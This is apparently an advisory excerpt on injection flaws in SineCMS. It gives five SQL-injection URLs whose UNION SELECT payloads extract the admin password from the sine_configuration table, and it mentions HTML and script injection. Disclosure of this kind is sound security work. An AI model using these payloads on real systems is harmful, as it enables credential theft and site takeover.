An attacker can exploit these issues via a browser.

The following SQL-injection examples were provided:

http://www.example.com/sinecms_path/mods.php?mods=Calendar&amp;action=info&amp;id='+union+select+1,password,3,4,5,6,7,8,9+from+sine_configuration/*

http://www.example.com/sinecms_path/admin/mods_adm.php?mods=Guestbook&amp;action=modifica&amp;id='+union+select+1,2,3,4,password,6+from+sine_configuration/*

http://www.example.com/sinecms_path/admin/mods_adm.php?mods=Calendar&amp;mese=11'+union+select+1,password,3,4,5,6,7,8,9+from+sine_configuration/*

http://www.example.com/sinecms_path/admin/mods_adm.php?mods=Calendar&amp;action=modify&amp;id='+union+select+1,2,3,4,password,6,7,8,9+from+sine_configuration/*

http://www.example.com/sinecms_path/admin/mods_adm.php?mods=Calendar&amp;anno='+union+select+1,password,3,4,5,6,7,8,9+from+sine_configuration/*

The attacker can exploit the HTML-injection vulnerabilities by submitting arbitrary HTML and script code.
